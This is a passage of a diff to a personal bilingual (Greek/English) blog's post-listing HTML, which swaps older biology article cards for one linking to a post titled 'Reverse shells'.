+      <time lang="el">13 Απρ 2018</time>
     </footer>
   </a>
 </article>
@@ -1070,194 +1410,16 @@ if (language) {
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/ess/" class="clearfix">
+  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/hawkdove.png);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Evolutionarily Stable Strategies (available in greek only)</h3>
-      <h3 class="title" lang="el">Εξελικτικά Σταθερές Στρατηγικές</h3>
+      <h3 class="title" lang="en">Reverse shells</h3>
+      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">01 Nov 2012</time>
-      <time lang="el">01 Νοε 2012</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/amyloids/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/amyloid.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Amyloid fibrils (available in greek only)</h3>
-      <h3 class="title" lang="el">Αμυλοειδή ινίδια</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">11 Jul 2012</time>
-      <time lang="el">11 Ιουλ 2012</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/centrioles/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/centrioles.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Centrioles (available in greek only)</h3>
-      <h3 class="title" lang="el">Κεντριόλια</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">22 Jan 2012</time>
-      <time lang="el">22 Ιαν 2012</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/multifunctional_proteins/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/multifunction.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Multifunctional proteins and evolution (available in greek only)</h3>
-      <h3 class="title" lang="el">Πολυλειτουργικές πρωτεΐνες και εξέλιξη</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">17 Jan 2012</time>
-      <time lang="el">17 Ιαν 2012</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/evolution_of_cetaceans/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dolphin.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">The evolution of Cetaceans (available in greek only)</h3>
-      <h3 class="title" lang="el">Η εξέλιξη των Kητωδών</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">17 Nov 2011</time>
-      <time lang="el">17 Νοε 2011</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/smallest_genome/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/microscope.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">The organism with the smallest genome and proteome</h3>
-      <h3 class="title" lang="el">Ο οργανισμός με το μικρότερο γονιδιώμα και πρωτέωμα</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">06 Aug 2011</time>
-      <time lang="el">06 Αυγ 2011</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/intraspecific_and_interspecific_competition/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/competition.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Intraspecific and Interspecific competition (available in greek only)</h3>
-      <h3 class="title" lang="el">Ενδοειδικός και Διαειδικός ανταγωνισμός</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">17 Nov 2010</time>
-      <time lang="el">17 Νοε 2010</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/microvilli/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/microvilli.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Microvilli (available in greek only)</h3>
-      <h3 class="title" lang="el">Μικρολάχνες</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">08 Jan 2010</time>
-      <time lang="el">08 Ιαν 2010</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/electric_current_and_human_body/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/electric.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Electric current and human body (available in greek only)</h3>
-      <h3 class="title" lang="el">Ηλεκτρικό ρεύμα και ανθρώπινο σώμα</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">01 Jun 2009</time>
-      <time lang="el">01 Ιουν 2009</time>
+      <time lang="en">12 Apr 2018</time>
+      <time lang="el">12 Απρ 2018</time>
     </footer>
   </a>
 </article>
@@ -1283,21 +1445,185 @@ if (language) {
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/brucellosis/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/Brucella.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Brucellosis (available in greek only)</h3>
-      <h3 class="title" lang="el">Βρουκέλλωση (Μελιταίος πυρετός)</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">21 Mar 2004</time>
-      <time lang="el">21 Μαρ 2004</time>
-    </footer>
-  </a>
-</article>
-
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
            
           
            
